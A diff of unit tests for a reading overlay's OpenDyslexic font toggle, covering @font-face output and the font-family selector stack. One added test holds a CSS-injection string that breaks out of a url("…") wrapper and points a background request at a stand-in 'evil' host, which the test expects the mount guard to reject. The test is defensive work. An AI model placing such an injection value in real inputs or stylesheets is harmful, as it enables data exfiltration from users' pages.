@@ -188,31 +188,49 @@ describe('createOverlay — OpenDyslexic toggle (#27)', () => {
     expect(getModal().classList.contains(OVERLAY_CLASS.OPENDYSLEXIC)).toBe(true);
     overlay.unmount();
   });
-});
 
-describe('OVERLAY_CSS — OpenDyslexic family stack (#27)', () => {
-  test('`.modal.opendyslexic` declaration sets font-family with OpenDyslexic first and a system-ui fallback', async () => {
-    const { OVERLAY_CSS } = await import('../styles');
-    // Bound the assertion to the load-bearing selector AND the family-order
-    // contract: OpenDyslexic must be the first family in the stack, and
-    // system-ui must appear in the fallback list so a font-load failure
-    // degrades gracefully. A bare `includes('OpenDyslexic')` would survive
-    // someone reordering the stack to put system-ui first (which would
-    // silently disable the toggle's visible effect on browsers that ship
-    // system-ui).
-    expect(OVERLAY_CSS).toMatch(
-      /\.modal\.opendyslexic\s*\{[^}]*font-family:[\s\S]*?'OpenDyslexic'[^}]*system-ui/,
+  test('@font-face rule binds OpenDyslexic to the supplied URL with woff2 format', () => {
+    const overlay = createOverlay(
+      makeOpts({
+        initialSettings: defaultSettings({ openDyslexic: true }),
+        openDyslexicFontUrl: FONT_URL,
+      }),
     );
+    overlay.mount();
+    const css = getShadowCss();
+    expect(css).toMatch(/@font-face\s*\{/);
+    expect(css).toMatch(/font-family:\s*'OpenDyslexic'/);
+    expect(css).toMatch(/format\('woff2'\)/);
+    overlay.unmount();
+  });
+
+  test('mount rejects a malicious openDyslexicFontUrl that tries to escape the url("…") wrapper', () => {
+    // Adversary string: closes the url("…") + format('…') pair, opens a
+    // new body rule, and exfiltrates via background: url('https://evil/…').
+    // The validation guard MUST refuse interpolation — i.e. mount throws —
+    // rather than silently emitting attacker-controlled CSS into the shadow.
+    const malicious = 'a") format("woff2"); } body { background: url("https://evil/';
+    const overlay = createOverlay(
+      makeOpts({
+        initialSettings: defaultSettings({ openDyslexic: true }),
+        openDyslexicFontUrl: malicious,
+      }),
+    );
+    expect(() => overlay.mount()).toThrow(/untrusted URL/);
   });
 });
 
-describe('buildOpenDyslexicFontFace — @font-face contract (#27)', () => {
-  test('emits a single @font-face rule binding `OpenDyslexic` to the supplied URL with woff2 format', async () => {
-    const { buildOpenDyslexicFontFace } = await import('../styles');
-    const out = buildOpenDyslexicFontFace(FONT_URL);
-    expect(out).toMatch(/@font-face\s*\{/);
-    expect(out).toMatch(/font-family:\s*'OpenDyslexic'/);
-    expect(out).toContain(FONT_URL);
-    expect(out).toMatch(/format\('woff2'\)/);
+describe('OVERLAY_CSS — OpenDyslexic family stack (#27)', () => {
+  test('OpenDyslexic family applies to reading-surface selectors with a system-ui fallback', async () => {
+    const { OVERLAY_CSS } = await import('../styles');
+    // Bound the assertion to the reading-surface selector list AND the
+    // family-order contract: OpenDyslexic must be the first family in the
+    // stack, and system-ui must appear in the fallback list so a font-load
+    // failure degrades gracefully. Scope is .word-region / .context-current
+    // / .context-preview (Safari parity floor — UI chrome stays in system
+    // font; whole-modal font swap is a future Chrome-UX extension).
+    expect(OVERLAY_CSS).toMatch(
+      /\.modal\.opendyslexic\s+\.word-region[\s\S]*?\.context-current[\s\S]*?\.context-preview\s*\{[^}]*font-family:[\s\S]*?'OpenDyslexic'[^}]*system-ui/,
+    );
   });
 });
